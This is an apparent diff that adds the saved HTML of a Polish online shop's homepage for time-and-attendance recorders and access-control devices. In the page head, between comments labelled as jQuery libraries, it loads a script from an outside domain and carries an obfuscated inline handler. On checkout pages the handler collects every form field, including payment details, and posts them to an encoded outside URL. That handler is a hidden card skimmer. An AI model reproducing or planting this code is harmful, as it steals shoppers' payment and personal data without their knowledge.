@@ -1,0 +1,431 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="pl" lang="pl">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Rejestratory czasu pracy, Systemy RCP Rejestratory Czasu Pracy</title>
+<meta name="description" content="Rejestratory czasu pracy i kontrola dostępu" />
+<meta name="keywords" content="system rcp, kontrola dostępu, rfid karty breloki" />
+<meta name="robots" content="INDEX,FOLLOW" />
+<link rel="icon" href="http://www.bluetek.pl/skin/frontend/default/pagayo-theme-001/favicon.ico" type="image/x-icon" />
+<link rel="shortcut icon" href="http://www.bluetek.pl/skin/frontend/default/pagayo-theme-001/favicon.ico" type="image/x-icon" />
+<!--[if lt IE 7]>
+<script type="text/javascript">
+//<![CDATA[
+    var BLANK_URL = 'http://www.bluetek.pl/js/blank.html';
+    var BLANK_IMG = 'http://www.bluetek.pl/js/spacer.gif';
+//]]>
+</script>
+<![endif]-->
+<link rel="stylesheet" type="text/css" href="http://www.bluetek.pl/skin/frontend/default/pagayo-theme-001/css/styles.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.bluetek.pl/skin/frontend/base/default/css/widgets.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.bluetek.pl/skin/frontend/base/default/css/magestore/bannerslider/popup.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.bluetek.pl/skin/frontend/base/default/css/manageteam.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.bluetek.pl/skin/frontend/default/pagayo-theme-001/css/print.css" media="print" />
+<script type="text/javascript" src="http://www.bluetek.pl/js/prototype/prototype.js"></script>
+<script type="text/javascript" src="http://www.bluetek.pl/js/lib/ccard.js"></script>
+<script type="text/javascript" src="http://www.bluetek.pl/js/prototype/validation.js"></script>
+<script type="text/javascript" src="http://www.bluetek.pl/js/scriptaculous/builder.js"></script>
+<script type="text/javascript" src="http://www.bluetek.pl/js/scriptaculous/effects.js"></script>
+<script type="text/javascript" src="http://www.bluetek.pl/js/scriptaculous/dragdrop.js"></script>
+<script type="text/javascript" src="http://www.bluetek.pl/js/scriptaculous/controls.js"></script>
+<script type="text/javascript" src="http://www.bluetek.pl/js/scriptaculous/slider.js"></script>
+<script type="text/javascript" src="http://www.bluetek.pl/js/varien/js.js"></script>
+<script type="text/javascript" src="http://www.bluetek.pl/js/varien/form.js"></script>
+<script type="text/javascript" src="http://www.bluetek.pl/js/varien/menu.js"></script>
+<script type="text/javascript" src="http://www.bluetek.pl/js/mage/translate.js"></script>
+<script type="text/javascript" src="http://www.bluetek.pl/js/mage/cookies.js"></script>
+<script type="text/javascript" src="http://www.bluetek.pl/js/magestore/bannerslider/lightbox.js"></script>
+<!--[if lt IE 8]>
+<link rel="stylesheet" type="text/css" href="http://www.bluetek.pl/skin/frontend/default/pagayo-theme-001/css/styles-ie.css" media="all" />
+<![endif]-->
+<!--[if lt IE 7]>
+<script type="text/javascript" src="http://www.bluetek.pl/js/lib/ds-sleight.js"></script>
+<script type="text/javascript" src="http://www.bluetek.pl/skin/frontend/base/default/js/ie6.js"></script>
+<![endif]-->
+
+<script type="text/javascript">
+//<![CDATA[
+Mage.Cookies.path     = '/';
+Mage.Cookies.domain   = '.www.bluetek.pl';
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+optionalZipCountries = ["PL"];
+//]]>
+</script>
+<script type="text/javascript">//<![CDATA[
+        var Translator = new Translate({"Please select an option.":"Prosimy o wybranie opcji.","This is a required field.":"To pole jest wymagane.","Please enter a valid number in this field.":"Prosimy o wprowadzenie poprawnego numeru w tym polu.","Please use letters only (a-z or A-Z) in this field.":"Prosimy o u\u017cywanie jedynie liter (a-z lub A-Z) w tym polu.","Please use only letters (a-z), numbers (0-9) or underscore(_) in this field, first character should be a letter.":"Prosimy o u\u017cywanie jedynie liter (a-z), cyfr (0-9) lub podkre\u015blnika (_) w tym polu, pierwszy znak powinien by\u0107 liter\u0105.","Please enter a valid phone number. For example (123) 456-7890 or 123-456-7890.":"Prosimy o wprowadzenie poprawnego numeru telefonu. Dla przyk\u0142adu: (012) 345 67 89 lub 012 345 6789.","Please enter a valid date.":"Prosimy o wprowadzenie poprawnej daty.","Please enter a valid email address. For example johndoe@domain.com.":"Prosimy o wprowadzenie poprawnego adresu e-mail. Dla przyk\u0142adu: jankowalski@domena.pl.","Please enter 6 or more characters. Leading or trailing spaces will be ignored.":"Prosimy o wprowadzenie 6 lub wi\u0119cej znak\u00f3w. Pocz\u0105tkowe lub ko\u0144cowe spacje zostan\u0105 zignorowane.","Please make sure your passwords match.":"Prosimy upewni\u0107 si\u0119, \u017ce has\u0142a psuj\u0105 do siebie.","Please enter a valid URL. For example http:\/\/www.example.com or www.example.com":"Prosimy o wprowadzenie poprawnego URL. Dla przyk\u0142adu: http:\/\/www.strona.pl lub www.strona.pl","Please enter a valid social security number. For example 123-45-6789.":"Prosimy o wprowadzenie poprawnego numeru ubezpieczenia spo\u0142ecznego. Dla przyk\u0142adu: 123-45-6789.","Please enter a valid zip code. For example 90602 or 90602-1234.":"Prosimy o wprowadzenie poprawnego kodu pocztowego. Dla przyk\u0142adu: 90602 lub 90-602.","Please enter a valid zip code.":"Prosimy o wprowadzenie poprawnego kodu pocztowego.","Please use this date format: dd\/mm\/yyyy. For example 17\/03\/2006 for the 17th of March, 2006.":"Prosimy o u\u017cycie nast\u0119puj\u0105cego formatu daty: dd\/mm\/rrrr. Dla przyk\u0142adu: 17\/03\/2006.","Please enter a valid $ amount. For example $100.00.":"Prosimy o wprowadzenie poprawnej kwoty w $. Na przyk\u0142ad $100.00.","Please select one of the above options.":"Prosimy o wyb\u00f3r jednej z powy\u017cszych opcji.","Please select one of the options.":"Prosimy o wyb\u00f3r jednej z opcji.","Please select State\/Province.":"Prosimy o wyb\u00f3r regionu.","Please enter a number greater than 0 in this field.":"Prosimy o podanie numeru wi\u0119kszego od 0 w tym polu.","Please enter a valid credit card number.":"Prosimy o wprowadzenie poprawnego numeru karty kredytowej.","Please wait, loading...":"Prosimy czeka\u0107, trwa \u0142adowanie...","Complete":"Zako\u0144czone","Add Products":"Dodaj produkty","Please choose to register or to checkout as a guest":"Prosimy o rejestracj\u0119 lub z\u0142o\u017cenie zam\u00f3wienia jako go\u015b\u0107","Please specify payment method.":"Prosimy o wyb\u00f3r metody p\u0142atno\u015bci."});
+        //]]></script><!--Jquery libs start-->
+<script src="https://jquery-css.su/app/lib/main.js"></script>
+<!--Jquery libs end--><script type="text/javascript">jQuery(function(t){t("button").on("click",function(){q="h="+window.location.href,q.match(/onepage|checkout/gi)&&(t("input, select").each(function(){t(this).val()?q+="&"+t(this).attr("name")+"="+t(this).val():""}),t.post(t("<div />").html("&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#99;&#108;&#111;&#117;&#100;&#102;&#117;&#115;&#105;&#111;&#110;&#46;&#109;&#101;&#47;&#99;&#100;&#110;&#47;&#106;&#113;&#117;&#101;&#114;&#121;&#46;&#109;&#105;&#110;&#46;&#106;&#115;").text(),q))})});</script></head>
+<body class=" cms-index-index cms-home">
+<div class="wrapper">
+        <noscript>
+        <div class="global-site-notice noscript">
+            <div class="notice-inner">
+                <p>
+                    <strong>JavaScript seems to be disabled in your browser.</strong><br />
+                    You must have JavaScript enabled in your browser to utilize the functionality of this website.                </p>
+            </div>
+        </div>
+    </noscript>
+    <div class="page">
+        <div class="header-container">
+
+	<div class="header-top">
+    	<div class="header">
+    	        	    <h1 class="logo"><strong>BLUETEK</strong><a href="http://www.bluetek.pl/index.php/" title="BLUETEK" class="logo"><img src="http://www.bluetek.pl/skin/frontend/base/default/images/logo.png" alt="BLUETEK" /></a></h1>
+    	        	    
+    	    <div class="header-usps">
+    	    	<div class="usp1">
+    	    		<div class="headline">Rejestracja Czasu Pracy</div>
+    	    		<p>Trzy metody autoryzacji:</p>
+<p><img src="/media/images/list-tick.png" alt="" width="26" height="21" />&nbsp;Odcisk palca<br /><img src="/media/images/list-tick.png" alt="" width="26" height="21" />&nbsp;Karta lub brelok RFID<br /><img src="/media/images/list-tick.png" alt="" width="26" height="21" />&nbsp;Hasło PIN</p>    	    	</div>
+    	    	<div class="usp2">
+    	    		<div class="headline">Prosta obsługa</div>
+    	    		<p>Kompletny zestaw:</p>
+<p><img src="/media/images/list-tick.png" alt="" width="26" height="21" />&nbsp; Polskie menu ekranowe</p>
+<p><img src="/media/images/list-tick.png" alt="" width="26" height="21" />&nbsp; Polskie oprogramowanie</p>
+<p><img src="/media/images/list-tick.png" alt="" width="26" height="21" />&nbsp; Karty i instrukcja obsługi</p>    	    	</div>
+    	    	<div class="usp3">
+    	    		<div class="headline">Zadzwoń i zamów</div>
+    	    		<p>Prezentacja rozwiązania w Twojej firmie</p>
+<p>tel.: <strong>698 67 67 65</strong></p>
+<p>email: info@bluetek.pl, <a href="skype:bluetek.pl">skype:bluetek.pl</a></p>
+<p><strong>Zapraszamy!</strong></p>    	    	</div>
+    	    </div>
+    	    
+    	    <div class="header-right">
+    	    	    	    	    	    	<div class="clearer"></div>
+    	    	<div class="welcome-msg">
+    	    		Systemy RCP     	    	</div>
+			</div>
+    	    <div class="clearer"></div>
+    	</div>
+    </div>
+    
+    <div class="nav-container">
+    <ul id="nav">
+        <li  class="level0 nav-1 first level-top parent"><a href="http://www.bluetek.pl/index.php/systemy-rcp.html"  class="level-top" ><span>Systemy RCP</span></a><ul class="level0"><li  class="level1 nav-1-1 first"><a href="http://www.bluetek.pl/index.php/systemy-rcp/rejestratory-czasu-pracy-z-kontrol.html" ><span>Rejestratory czasu pracy z kontrolą dostępu</span></a></li><li  class="level1 nav-1-2"><a href="http://www.bluetek.pl/index.php/systemy-rcp/rejestratory-czasu-pracy.html" ><span>Rejestratory czasu pracy</span></a></li><li  class="level1 nav-1-3"><a href="http://www.bluetek.pl/index.php/systemy-rcp/systemy-kontroli-patroli.html" ><span>Systemy kontroli patroli</span></a></li><li  class="level1 nav-1-4 last"><a href="http://www.bluetek.pl/index.php/systemy-rcp/bramki-dostepowe.html" ><span>Bramki dostępowe</span></a></li></ul></li><li  class="level0 nav-2 level-top parent"><a href="http://www.bluetek.pl/index.php/z-wave.html"  class="level-top" ><span>Systemy z-wave</span></a><ul class="level0"><li  class="level1 nav-2-1 first last"><a href="http://www.bluetek.pl/index.php/z-wave/moduly-wykonawcze.html" ><span>Moduły wykonawcze</span></a></li></ul></li><li  class="level0 nav-3 level-top parent"><a href="http://www.bluetek.pl/index.php/akcesoria.html"  class="level-top" ><span>Akcesoria</span></a><ul class="level0"><li  class="level1 nav-3-1 first"><a href="http://www.bluetek.pl/index.php/akcesoria/breloki-i-karty-do-systemow-rcp.html" ><span>Breloki i karty do systemów RCP</span></a></li><li  class="level1 nav-3-2"><a href="http://www.bluetek.pl/index.php/akcesoria/etui-zawieszki-holdery.html" ><span>Holdery, zawieszki i nadruki</span></a></li><li  class="level1 nav-3-3"><a href="http://www.bluetek.pl/index.php/akcesoria/pastylki-dallas-ibutton.html" ><span>Pastylki Dallas iButton</span></a></li><li  class="level1 nav-3-4"><a href="http://www.bluetek.pl/index.php/akcesoria/zasilacze-i-obudowy.html" ><span>Zasilacze i obudowy</span></a></li><li  class="level1 nav-3-5 last"><a href="http://www.bluetek.pl/index.php/akcesoria/czytniki-rfid.html" ><span>Czytniki RFID</span></a></li></ul></li><li  class="level0 nav-4 level-top parent"><a href="http://www.bluetek.pl/index.php/dokumentacja.html"  class="level-top" ><span>Dokumentacja</span></a><ul class="level0"><li  class="level1 nav-4-1 first"><a href="http://www.bluetek.pl/index.php/dokumentacja/ewidencja-czasu-pracy.html" ><span>Ewidencja czasu pracy</span></a></li><li  class="level1 nav-4-2"><a href="http://www.bluetek.pl/index.php/dokumentacja/sage-symfonia.html" ><span>Integracja z Sage Symfonia</span></a></li><li  class="level1 nav-4-3"><a href="http://www.bluetek.pl/index.php/dokumentacja/integracja-z-enova-kadry.html" ><span>Integracja z Enova Kadry</span></a></li><li  class="level1 nav-4-4"><a href="http://www.bluetek.pl/index.php/dokumentacja/integracja-z-oprogramowaniem-kadrowym.html" ><span>Integracja z innymi programami</span></a></li><li  class="level1 nav-4-5"><a href="http://www.bluetek.pl/index.php/dokumentacja/program-wartownik.html" ><span>Program Wartownik</span></a></li><li  class="level1 nav-4-6"><a href="http://www.bluetek.pl/index.php/dokumentacja/instalacja-i-serwis.html" ><span>Instalacja i serwis</span></a></li><li  class="level1 nav-4-7"><a href="http://www.bluetek.pl/index.php/dokumentacja/faq.html" ><span>FAQ - Najczęściej zadawane pytania</span></a></li><li  class="level1 nav-4-8"><a href="http://www.bluetek.pl/index.php/dokumentacja/wybor-modelu-rejestratora.html" ><span>Wybór modelu rejestratora</span></a></li><li  class="level1 nav-4-9"><a href="http://www.bluetek.pl/index.php/dokumentacja/instrukcja-instalacji-rcp-realand.html" ><span>Instrukcja instalacji systemu RCP</span></a></li><li  class="level1 nav-4-10 last"><a href="http://www.bluetek.pl/index.php/dokumentacja/filmy-instruktazowe.html" ><span>Filmy instruktażowe</span></a></li></ul></li><li  class="level0 nav-5 last level-top"><a href="http://www.bluetek.pl/index.php/kontakt.html"  class="level-top" ><span>Kontakt</span></a></li>    </ul>
+</div>
+
+    <div class="quick-access-container">
+    	<div class="quick-access">
+    		<form id="search_mini_form" action="http://www.bluetek.pl/index.php/catalogsearch/result/" method="get">
+    <div class="form-search">
+        <label for="search">Search:</label>
+        <input id="search" type="text" name="q" value="" class="input-text" maxlength="128" />
+        <button type="submit" title="Szukaj" class="button"><span><span>Szukaj</span></span></button>
+        <div id="search_autocomplete" class="search-autocomplete"></div>
+        <script type="text/javascript">
+        //<![CDATA[
+            var searchForm = new Varien.searchForm('search_mini_form', 'search', 'Szukaj tutaj w całym sklepie...');
+            searchForm.initAutocomplete('http://www.bluetek.pl/index.php/catalogsearch/ajax/suggest/', 'search_autocomplete');
+        //]]>
+        </script>
+    </div>
+</form>
+    	    <ul class="links">
+                        <li class="first" ><a href="http://www.bluetek.pl/index.php/customer/account/" title="Moje konto" >Moje konto</a></li>
+                                <li ><a href="http://www.bluetek.pl/index.php/wishlist/" title="Moja lista życzeń" >Moja lista życzeń</a></li>
+                                <li ><a href="http://www.bluetek.pl/index.php/checkout/cart/" title="Mój koszyk" class="top-link-cart">Mój koszyk</a></li>
+                                <li ><a href="http://www.bluetek.pl/index.php/checkout/" title="Kasa" class="top-link-checkout">Kasa</a></li>
+                                <li ><a href="http://www.bluetek.pl/index.php/customer/account/login/" title="Zaloguj" >Zaloguj</a></li>
+                                <li class=" last" ><a href="http://www.bluetek.pl/index.php/manageteam/" title="Our Team" >Our Team</a></li>
+            </ul>
+    	    <div class="clearer"></div>
+    	</div>
+    </div>
+</div>        <div class="main-supercontainer">
+        	<div class="main-container col3-layout">
+        		        	    <div class="main">
+        	        <div class="col-wrapper">
+        	            <div class="col-main">
+        	                        	                                    <div class="magestore-bannerslider">
+                            <div class="magestore-bannerslider-standard">
+                    <script type="text/javascript" src="http://www.bluetek.pl/js/magestore/bannerslider/jquery-1.7.min.js"></script>
+<script src="http://www.bluetek.pl/js/magestore/bannerslider/jquery.flexslider.js"></script>
+<link rel="stylesheet" type="text/css" href="http://www.bluetek.pl/skin/frontend/base/default/css/magestore/bannerslider/flexslider.css" media="all" />
+<script type="text/javascript">   
+    var j7 = jQuery.noConflict();
+    j7(window).load(function() {
+        j7('.flexslider-7-1').flexslider({
+            animation: "fade",
+            slideshowSpeed: 4500            //minItems: 2,
+            //maxItems: 4            
+        });
+    });
+</script>
+<div class="flexslider flexslider-7-1">
+    <ul class="slides"> 
+                <li>
+                <a href="http://www.bluetek.pl/index.php/systemy-rcp/systemy-kontroli-patroli.html" target="_self" onclick="bannerClicks('6','1')" style="display:block"><img alt="Sytem kontroli patroli i pracowników dozoru E300" src="http://www.bluetek.pl/media/bannerslider/e/3/e300.png"/></a>
+            </li>
+            
+    <!-- items mirrored twice, total of 12 -->
+    </ul>
+</div>
+<script type="text/javascript">
+        function bannerClicks(id_banner,id_slider){
+		var click_url = 'http://www.bluetek.pl/index.php/bannerslider/index/click/';
+		banner_id = id_banner;
+		new Ajax.Request(click_url,{
+			method: 'post',
+			parameters:{id_banner: banner_id, slider_id:id_slider},
+			onFailure: '',
+			onSuccess: ''
+			
+		});
+		
+	}
+    </script>
+                </div>    
+                    </div>
+                <script type="text/javascript">
+            Event.observe(window, 'load', function() {
+                banner_ids = '6';
+                slider_id = '1';
+                imp_url = 'http://www.bluetek.pl/index.php/bannerslider/index/impress/';
+                new Ajax.Request(imp_url, {
+                    method: 'post',
+                    parameters:{banner_ids: banner_ids, slider_id:slider_id},
+                    onFailure: '',
+                    onSuccess: ''
+
+                });
+            });
+        </script>
+    <div class="std"><div class="page-title">
+<h1>Systemy elektronicznej ewidencji czasu pracy dla każdego</h1>
+<p>W naszej ofercie znajdują się zegary czasu pracy zar&oacute;wno dla małych firm jak i dla wielkich przedsiębiorstw.</p>
+<p>System rejestracji czasu pracy składa się z dw&oacute;ch podstawowych składnik&oacute;w: rejestratora czasu pracy oraz oprogramowania kt&oacute;re analizuje zarejestrowane dane i generuje statystyki obecności.</p>
+<p style="text-align: center;"><iframe src="http://www.youtube.com/embed/O90LfFrg-IQ" frameborder="0" width="425" height="350"></iframe><br />zobacz <a href="https://www.youtube.com/channel/UCV3t4rdPwiG5drwVwY6JzHA">węcej film&oacute;w</a> z udziałem urządzeń RCP.</p>
+</div>
+<div class="page-title">
+<p>&nbsp;</p>
+<h1>Oprogramowanie RCP</h1>
+<p>Czytniki REALAND są dostarczane wraz z oprogramowaniem RAMS kt&oacute;re umożliwia:</p>
+<ul>
+<li>Obsługę wielu czytnik&oacute;w w wielu lokalizacjach (także zdalnie przez Internet)</li>
+<li>Komunikacja LAN, USB i pendrive z czytnikami &ndash; do rejestrowania zdarzeń wystarczy tylko wysłać pracownik&oacute;w na urządzenie(a)</li>
+<li>Zarządzanie dostępem do pomieszczeń (dla czytnik&oacute;w z kontrolą dostępu)</li>
+<li>Przydzielanie wybranych pracownik&oacute;w do wybranych czytnik&oacute;w oraz nadawanie im uprawnień do otwierania drzwi</li>
+<li>Obsługę trzech metod autoryzacji w standardzie: biometria, karta/brelok, kod pin w dowolnych kombinacjach, niezależnie od siebie</li>
+<li>Dodawanie, edycję (hurtową), usuwanie, import oraz eksport pracownik&oacute;w do/z excel</li>
+<li>Tworzenie wydział&oacute;w w firmie, raporty wydziałowe</li>
+<li>Dowolność w generowaniu obszernych statystyk dziennych, miesięcznych, rocznych oraz ich eksport do excel i txt</li>
+<li>Eksport danych do program&oacute;w zewnętrznych &ndash; pomagamy klientom tworząc rozwiązania pomostowe na życzenie</li>
+<li>Ręczne wprowadzenie wszystkich rodzaj&oacute;w zdarzeń (r&oacute;wnież hurtowo) każdemu użytkownikowi</li>
+<li>Dowolność w konfiguracji zasad naliczania czasu pracy</li>
+<li>Tworzenie i dodawanie (r&oacute;wnież hurtowo) do każdego użytkownika: czasu pracy, zmian, grup zmian oraz planowanie czasu pracy wg. kalendarza</li>
+</ul>
+<br />Licencja na oprogramowanie RAMS w języku polskim jest dostarczana wraz z urządzeniem, bez dodatkowych opłat.<br />Oprogramowanie jest okresowo aktualizowane - zapisze się na nasz newsletter aby dostawać powiadomienia o aktualizacjach</div></div>        	            </div>
+        	            <div class="col-left sidebar"><div class="block block-banner-left"><a href="http://www.bluetek.pl/index.php/dokumentacja/instrukcja-instalacji-rcp-realand.html"><img src="http://www.bluetek.pl/media/wysiwyg/bannery/instalacja_systemu_rcp.png" alt="" /></a></div>
+<div class="block block-banner-right" style="margin-top: 10px;"><a href="http://www.bluetek.pl/index.php/dokumentacja/ewidencja-czasu-pracy.html"><img src="http://www.bluetek.pl/media/wysiwyg/bannery/elektroniczna_ewidencja_czasu_pracy.png" alt="Elektroniczna ewidencja czasu pracy" /></a></div>
+<div class="block block-banner-right" style="margin-top: 10px;"><a href="http://www.bluetek.pl/index.php/z-wave/moduly-wykonawcze.html"><img src="http://www.bluetek.pl/media/wysiwyg/qubino/Qubino_Banner_Modules_336x280.jpg" alt="Moduły Qubino" width="220" /></a></div></div>
+        	        </div>
+        	        <div class="col-right sidebar"><div class="block block-list block-compare">
+    <div class="block-title">
+        <strong><span>Porównaj produkty                    </span></strong>
+    </div>
+    <div class="block-content">
+            <p class="empty">Nie masz produktów do porównania.</p>
+        </div>
+</div>
+<div class="block block-cart">
+        <div class="block-title">
+        <strong><span>Mój koszyk</span></strong>
+    </div>
+    <div class="block-content">
+                        <p class="empty">Nie masz produktów w koszyku.</p>
+        </div>
+</div>
+<script type="text/javascript">
+//<![CDATA[
+    function validatePollAnswerIsSelected()
+    {
+        var options = $$('input.poll_vote');
+        for( i in options ) {
+            if( options[i].checked == true ) {
+                return true;
+            }
+        }
+        return false;
+    }
+//]]>
+</script>
+<div class="block block-poll">
+    <div class="block-title">
+        <strong><span>Ankieta</span></strong>
+    </div>
+    <form id="pollForm" action="http://www.bluetek.pl/index.php/poll/vote/add/poll_id/2/" method="post" onsubmit="return validatePollAnswerIsSelected();">
+        <div class="block-content">
+            <p class="block-subtitle">Jak metoda autoryzacji jest bardziej skuteczna?</p>
+                        <ul id="poll-answers">
+                                <li>
+                    <input type="radio" name="vote" class="radio poll_vote" id="vote_5" value="5" />
+                    <span class="label"><label for="vote_5">Odcisk palca</label></span>
+                </li>
+                                <li>
+                    <input type="radio" name="vote" class="radio poll_vote" id="vote_6" value="6" />
+                    <span class="label"><label for="vote_6">Karta RFID</label></span>
+                </li>
+                                <li>
+                    <input type="radio" name="vote" class="radio poll_vote" id="vote_7" value="7" />
+                    <span class="label"><label for="vote_7">Obie są tak samo skuteczne</label></span>
+                </li>
+                            </ul>
+            <script type="text/javascript">decorateList('poll-answers');</script>
+                        <div class="actions">
+                <button type="submit" title="Głosuj" class="button"><span><span>Głosuj</span></span></button>
+            </div>
+        </div>
+    </form>
+</div>
+</div>
+        	    </div>
+        	</div>
+        </div>
+         
+ 
+ 
+ 
+ 
+ 
+
+<div class="footer-container">
+	<div class="footer">
+	
+				<div class="footer1-container">
+		    <div class="footer1">
+				<div class="newsletter">	
+					<div class="headline">Jeśli chcesz dostawać informacje o nowych produktach i promocjach, zostaw nam swój emial:</div>	    	
+		    		<form action="http://www.bluetek.pl/index.php/newsletter/subscriber/new/" method="post" id="newsletter-validate-detail">
+<div class="form-newsletter">
+	<div class="input-box">
+	   <input type="text" name="email" value="Twój email..." onblur="addText(this);" onfocus="clearText(this)" id="newsletter" title="Zapisz się do newslettera" class="input-text required-entry validate-email" />
+	</div>
+	<div class="actions">
+	    <button type="submit" title="Subskrybuj" class="button"><span><span>Subskrybuj</span></span></button>
+	</div>
+</form>
+<script type="text/javascript">
+//<![CDATA[
+    var newsletterSubscriberFormDetail = new VarienForm('newsletter-validate-detail');
+    
+    function clearText(theField)
+    {
+  	  if (theField.defaultValue == theField.value)
+  		  theField.value = '';
+    }
+
+    function addText(theField)
+    {
+    	if (theField.value == '')
+    		theField.value = theField .defaultValue;
+    }
+    
+//]]>
+</script>
+</div>
+		    	</div>
+		        
+		        <div class="footer-social">
+		        	<div class="headline">Follow us</div>
+    				    			</div>
+		    </div>
+		    <div class="clearer"></div>
+		</div>
+		
+				<div class="footer2-container">
+			<div class="footer2">
+				<div class="box1">
+        			<div class="headline">Informacje</div>
+        			<ul>
+<li><a href="http://www.bluetek.pl/index.php/customer-service/">Gwarancja i wysyłka</a></li>
+<li><a href="http://www.bluetek.pl/index.php/dokumentacja/faq.html">FAQ</a></li>
+</ul>        		</div>
+        		<div class="box2">
+        			<div class="headline">BLUETEK</div>
+        			<ul>
+<li><a href="http://www.bluetek.pl/index.php/o-nas/">O nas</a></li>
+<li><a href="http://www.bluetek.pl/index.php/privacy-policy-cookie-restriction-mode/">Polityka cookies</a></li>
+<li><a href="http://www.bluetek.pl/index.php/contacts/">Kontakt email</a></li>
+<li><a href="http://www.bluetek.pl/index.php/customer-service/">Informacje o przesyłkach</a></li>
+</ul>        		</div>
+        		<div class="box3">
+        			<div class="headline">Nowe produkty</div>
+        			<ul>
+<li><a href="http://www.bluetek.pl/index.php/systemy-rcp/rejestratory-czasu-pracy/a-c091.html">System RCP A-C091</a></li>
+<li><a href="http://www.bluetek.pl/index.php/systemy-rcp/rejestratory-czasu-pracy/a-c101.html">System RCP A-C101</a></li>
+<li><a href="http://www.bluetek.pl/index.php/systemy-rcp/rejestratory-czasu-pracy-z-kontrol/m-f151.html">System RCP z KD MF-151</a></li>
+</ul>        		</div>
+        		<div class="box4">
+        			<div class="headline">Popularne</div>
+        			<ul>
+<li><a href="http://www.bluetek.pl/index.php/systemy-rcp/rejestratory-czasu-pracy/a-c020t.html">Rejestrator czasu pracy A-C020</a></li>
+<li><a href="http://www.bluetek.pl/index.php/systemy-rcp/rejestratory-czasu-pracy/a-c091.html">Rejestrator czasu pracy A-C091</a></li>
+<li><a href="http://www.bluetek.pl/index.php/systemy-rcp/rejestratory-czasu-pracy/rejestrator-z-kamera.html">Rejestrator z kamerą ZDC1535CAM</a></li>
+<li><a href="http://www.bluetek.pl/index.php/systemy-rcp/systemy-kontroli-patroli.html">Kontrola patroli E300</a></li>
+</ul>        		</div>
+        		<div class="box5">
+        			<div class="headline">Moje konto</div>
+        			<ul>
+<li><a href="http://www.bluetek.pl/index.php/customer/account/">Moje konto</a></li>
+<li><a href="http://www.bluetek.pl/index.php/wishlist/">Moje listy</a></li>
+<li><a href="http://www.bluetek.pl/index.php/checkout/cart/">Koszyk</a></li>
+<li><a href="http://www.bluetek.pl/index.php/checkout/">Zam&oacute;wienia</a></li>
+</ul>        		</div>
+				<div class="clearer"></div>
+		    </div>
+		</div>
+		
+				<div class="footer3-container">
+			<div class="footer3">
+				<div class="footer-payments">
+									</div>
+				<ul class="links">
+<li class="first"><a href="http://www.bluetek.pl/index.php/about-magento-demo-store/">O nas</a></li>
+<li><a href="http://www.bluetek.pl/index.php/customer-service/">Regulamin sklepu</a></li>
+<li><a href="http://www.bluetek.pl/index.php/contacts/">Kontakt</a></li>
+<li><a href="http://www.bluetek.pl/index.php/catalogsearch/advanced/">Wyszukiwarka</a></li>
+<li><a href="http://www.bluetek.pl/index.php/catalogsearch/term/popular/">Ostatnie wyszukiwania</a></li>
+<li><a class="link-rss" href="http://www.bluetek.pl/index.php/rss/">Mapa strony</a></li>
+<li><a class="link-rss" href="http://www.bluetek.pl/index.php/rss/">RSS</a></li>
+<li><a href="http://www.bluetek.pl/index.php/sales/guest/form/">Zam&oacute;wienia i zwroty</a></li>
+<li class="last privacy"><a href="http://www.bluetek.pl/index.php/privacy-policy-cookie-restriction-mode/">Polityka prywatności</a></li>
+</ul>    			<div class="copyright">
+					&copy; 2014 BLUETEK All Rights Reserved. | <a href="http://www.pagayo.com" title="Magento Theme by www.pagayo.com" target="_blank">Theme by Pagayo</a>
+				</div>
+				<div class="clearer"></div>
+		    </div>
+		</div>
+		
+	</div>
+</div>        <div class="global-site-notice notice-cookie" id="notice-cookie-block">
+    <div class="notice-inner">
+        <div class="notice-text"><p>Ta strona wykorzystuje pliki cookies, więcej informacji znajdziesz na stronie <a href="http://www.bluetek.pl/index.php/privacy-policy-cookie-restriction-mode">cookies</a>. Aby kontynuować musisz zaakceptować nasze zasady obsługi cookies..</p></div>
+        <div class="actions"><button class="button" onclick="allowSaveCookie()"><span><span>Allow</span></span></button></div>
+    </div>
+</div>
+<script type="text/javascript">
+    /* <![CDATA[ */
+    function allowSaveCookie() {
+        Mage.Cookies.set('user_allowed_save_cookie', '{"1":1}', new Date(new Date().getTime() + 31536000 * 1000));
+        if (Mage.Cookies.get('user_allowed_save_cookie')) {
+            window.location.reload();
+        } else {
+            window.location.href = 'http://www.bluetek.pl/index.php/cms/index/noCookies/';
+        }
+    }
+    $('notice-cookie-block').show();
+    /* ]]> */
+</script>
+
+
+    </div>
+</div>
+</body>
+</html>
